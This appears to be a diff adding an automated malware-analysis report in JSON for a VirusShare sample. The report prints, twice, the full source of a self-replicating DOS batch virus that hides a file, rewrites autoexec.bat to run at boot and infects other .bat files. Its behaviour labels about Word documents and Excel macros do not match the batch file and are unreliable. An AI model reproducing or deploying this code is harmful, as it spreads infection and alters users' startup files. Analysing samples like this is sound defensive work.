@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": ":Version 1.01\n@ctty nul\nif not exist c:\\cigar.bat goto cigar\nfor %%i in (*.bat) do set cigar=%%i\nfor %%o in (%cigar%) do if \"%cigar%\"==\"AUTOEXEC.BAT\" goto mod\ngoto n\n:cigar\necho @echo off >> c:\\cigar.bat\necho echo You can find me? >> c:\\cigar.bat\nattrib c:\\cigar.bat +h +r\n:mod\nattrib autoexec.bat -r\ncopy autoexec.bat autoexec.olf\necho @if exist C:\\CIGAR.BAT call C:\\CIGAR.BAT > autoexec.bat\ntype autoexec.olf >> autoexec.bat\ndel autoexec.olf\n:n\nfor %%t in (*.bat ..\\*.bat ..\\..\\*.bat) do find \"cigar\" %%t\nif not errorlevel 1 goto stp\nfor %%y in (%cigar%) do type %0 >> %%y\n:stp"
+    },
+    "filename": "VirusShare_4137b63439b76a2beb02213288e53134",
+    "filesize": 601,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4137b63439b76a2beb02213288e53134",
+        "sha1": "d6d5836cea45e992d1e52327161c5af7f16ac9db",
+        "sha256": "33c724b5750e9dc8ec93651cfd3a1bac973326d39731e79d00fdbe109725fdf5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":Version 1.01",
+            "@ctty nul",
+            "if not exist c:\\cigar.bat goto cigar",
+            "for %%i in (*.bat) do set cigar=%%i",
+            "for %%o in (%cigar%) do if \"%cigar%\"==\"AUTOEXEC.BAT\" goto mod",
+            "goto n",
+            ":cigar",
+            "echo @echo off >> c:\\cigar.bat",
+            "echo echo You can find me? >> c:\\cigar.bat",
+            "attrib c:\\cigar.bat +h +r",
+            ":mod",
+            "attrib autoexec.bat -r",
+            "copy autoexec.bat autoexec.olf",
+            "echo @if exist C:\\CIGAR.BAT call C:\\CIGAR.BAT > autoexec.bat",
+            "type autoexec.olf >> autoexec.bat",
+            "del autoexec.olf",
+            "for %%t in (*.bat ..\\*.bat ..\\..\\*.bat) do find \"cigar\" %%t",
+            "if not errorlevel 1 goto stp",
+            "for %%y in (%cigar%) do type %0 >> %%y",
+            ":stp"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275842",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
